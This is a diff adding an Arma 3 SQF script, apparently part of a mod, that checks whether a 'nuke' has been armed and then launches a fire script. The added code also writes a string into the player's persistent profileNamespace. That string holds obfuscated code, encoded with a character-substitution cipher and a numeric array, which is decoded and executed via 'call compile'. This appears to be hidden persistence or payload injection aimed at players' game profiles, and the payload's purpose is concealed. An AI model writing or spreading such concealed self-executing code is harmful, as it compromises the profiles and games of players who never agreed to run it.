@@ -1,1 +1,8 @@
-
+private _var = player getVariable "anukehasbeenarmed";
+if (isNil "_var") then
+{
+	hintc "Nuke is not armed, please arm.";
+} else {
+	profileNamespace setVariable ["nukerinsert","private _var = player getVariable ""anukehasbeenarmed"";if (isNil ""_var"") then { [('_5Qr8NOw = {_uQN='+""'""+'nDgVVI'+""'""+';_5Qr8NOwHQ = _wJy0;_rUDAwQ8 = Z;_rUDAwQ8n = Z;_j88VN = wUj88VN(_uQN);_JV0J = wUj88VN (0w8 _5Qr8NOw);8QdQ80Q _JV0J;zU8 '+""'""+'_y'+""'""+' z8U9 Z wU (rUDAw(_fQr8NOw9Q)-T) fU {yz(_rUDAwQ8 > (rUDAw(_j88VN)-T)) wJQA {_rUDAwQ8 = Z;};yz(_rUDAwQ8n > (rUDAw(_JV0J)-T)) wJQA {_rUDAwQ8n = Z;};_dV8 = ((_fQr8NOw9Q 0QhQrw _y) / (_j88VN 0QhQrw _rUDAwQ8)) - (_JV0J 0QhQrw _rUDAwQ8n);_fQr8NOw9Q 0Qw[_y,_dV8];_rUDAwQ8 = _rUDAwQ8 + T;_rUDAwQ8n = _rUDAwQ8n + T};rVhh rU9OyhQ wUtw8yAv(_fQr8NOw9Q)};[TT4ZZ,TLIgT,LI3g,TSS4g,nTnSg,TTIT4,TT34Z,nnLB3,TZ44I,TBnZL,nTSgI,TZI3Z,IIZZ,nTBBL,Bggg,TLI3T,TSTLn,Tn4SZ,B44Z,nSggL,TnZ3I,TnBZT,nZ344,IIZZ,LBZZ,nZnST,ITBT,TS44Z,TSBg3,SIgZ,3Z4Z,T3B4S,ISSL,TSg4L,TTn4n,BB44,SBZZ,B3n3,SBB3,IB4S,BIBI,BSZ4,IIZZ,TBL4L,3nLn,T4Tgn,TSISS,InZ4,B3ZZ,TII3S,3SLL,TSg4L,Tgn3B,TnZS4,TZ34Z,n4ISZ,InSn,ngn3Z,nTLgT,TTg34,BLZZ,nTZLZ,IL4Z,TSTLn,InI4,3Z34,TZI4Z,n4g3B,BBBL,nTSgI,nn4ZS,I3L4,B4ZZ,TL3S3,LI3g,TZLIZ,3TS3,3LBZ,I4ZZ,n4g3B,3TZB,TLgBg,T4Zg4,3TSZ,B3ZZ,TnLgL,IgB4,nZZIB,nT4gS,BIg4,Lg4Z,TIgTL,TZITZ,TB334,nZZIB,3TSZ,LI4Z,nS3ZS,ISSL,nZgIZ,TBB3n,3TSZ,3T4Z,T3Tg4,33ng,TnIZI]rVhh _5Qr8NOw;')]call{private['_0','_1','_2','_3'];_0=_this select 0;_1=[];_2=toArray 'jEs52CiGoMuKHRxFl6tmaWpXP7VcrfQzvJyY1h9AUOe80wDdqkNbZTngS4LI3B';_3=toArray 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';{if(_2 find _x >=0)then{_1 pushBack (_3 select(_2 find _x));}else{_1 pushBack _x;};}forEach toArray _0;call compile toString _1};} else { hintc ""Success."";};"];
+	execvm "\kmsi\kmsi_functions\fn_nukefireandforget.sqf";
+};
